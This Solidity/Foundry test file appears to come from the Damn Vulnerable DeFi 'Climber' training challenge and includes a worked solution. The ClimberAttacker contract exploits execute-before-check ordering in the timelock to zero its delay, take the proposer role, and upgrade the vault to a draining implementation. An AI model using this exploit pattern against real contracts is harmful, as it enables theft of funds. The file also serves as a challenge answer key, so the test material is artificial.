// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ERC1967Utils} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol";
import {IERC1822Proxiable} from "@openzeppelin/contracts/interfaces/draft-IERC1822.sol";
import {IAccessControl} from "@openzeppelin/contracts/access/IAccessControl.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        new ClimberAttacker(vault, timelock, token, recovery).attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract ClimberAttacker is IERC1822Proxiable{
    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;
    address recovery;

    constructor (ClimberVault _vault, ClimberTimelock _timelock, DamnValuableToken _token, address _recovery) {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        recovery = _recovery;
    }

    function getOperation() internal view returns (address[] memory targets, uint256[] memory values, bytes[] memory dataElements) {

        // updateDelay, grantRole, callback to schedule, and change implementation

        uint256 tx_count = 4; 
        targets = new address[](tx_count);
        values = new uint256[](tx_count);
        dataElements = new bytes[](tx_count);

        targets[0] = address(timelock);
        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);

        targets[1] = address(timelock);
        dataElements[1] = abi.encodeWithSelector(IAccessControl.grantRole.selector, PROPOSER_ROLE, address(this));

        targets[2] = address(this);
        dataElements[2] = abi.encodeWithSelector(this.callback.selector);
        
        targets[3] = address(vault);
        dataElements[3] = abi.encodeWithSelector(UUPSUpgradeable.upgradeToAndCall.selector, address(this), hex"");
    
        values[0] = values[1] = values[2] = values[3] = 0;
    }

    function attack() public payable {
        address[] memory targets;
        uint256[] memory values;
        bytes[] memory dataElements;
        (targets, values, dataElements) = getOperation();
        timelock.execute(targets, values, dataElements, bytes32(0));
        vault.withdraw(address(token), recovery, token.balanceOf(address(vault)));
    }

    function callback() external {
        require(msg.sender == address(timelock));
        address[] memory targets;
        uint256[] memory values;
        bytes[] memory dataElements;
        (targets, values, dataElements) = getOperation();
        timelock.schedule(targets, values, dataElements, bytes32(0));    
    }

    function proxiableUUID() external pure returns (bytes32) {
        return ERC1967Utils.IMPLEMENTATION_SLOT;
    }

    // for delegate
    function withdraw(address _token, address to, uint256 amount) public {
        DamnValuableToken(_token).transfer(to, amount);
    }
}
